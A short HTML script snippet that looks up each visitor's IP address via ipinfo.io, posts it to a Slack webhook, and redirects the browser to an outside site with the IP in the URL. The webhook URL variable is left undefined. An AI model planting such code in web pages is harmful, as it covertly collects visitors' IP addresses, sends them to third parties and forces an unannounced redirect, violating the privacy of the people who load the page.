<script>
function slack(message) {

    const data = {
        text: message
    };
    $.ajax({
        type: 'POST',
        url:  url,
        data: `payload=${JSON.stringify(data)}`
    });
}

fetch('https://ipinfo.io?callback')
  .then(res => res.json())

$.getJSON('https://ipinfo.io', res => slack(res.ip))
 
axios.get('https://ipinfo.io').then(res => window.location.href = 'http://keiromichi.com/index.php?ip=' + res.data.ip)

</script>
